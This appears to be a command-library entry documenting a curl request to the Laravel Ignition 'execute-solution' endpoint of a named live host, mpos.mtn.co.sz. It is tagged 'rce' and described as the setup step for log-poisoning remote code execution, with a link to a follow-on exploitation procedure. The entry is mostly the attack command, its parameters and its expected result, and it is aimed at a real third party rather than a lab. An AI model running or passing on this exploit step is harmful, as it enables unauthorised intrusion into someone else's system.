---
data: >-
  curl -XPOST -H'Content-Type: application/json' -d
  '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"AA"},}'
  https://mpos.mtn.co.sz/_ignition/execute-solution
tags:
  - rce
  - ignition
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.585Z'
id: 9f66195a-6e0c-4dcd-999e-504b239fd593
verified: false
validated: true
submitted: true
---
# curl-ignition-log-poisoning-setup

## Command

```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"AA"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

## Description

Triggers a simple error in Ignition to prepare or clear the laravel.log file by specifying an invalid viewFile 'AA'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -XPOST | HTTP method | Yes |
| -H'Content-Type: application/json' | Sets JSON header | Yes |
| -d '{...}' | JSON payload with solution and parameters | Yes |
| URL | Ignition endpoint | Yes |

## Examples

### Basic Usage

As above, to log invalid view.

### Advanced Usage

Adjust variableName for different errors.

## Expected Output

HTTP response (likely 500) indicating error logged; aids payload isolation.

## Related

- [[Related Procedure: Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl]]
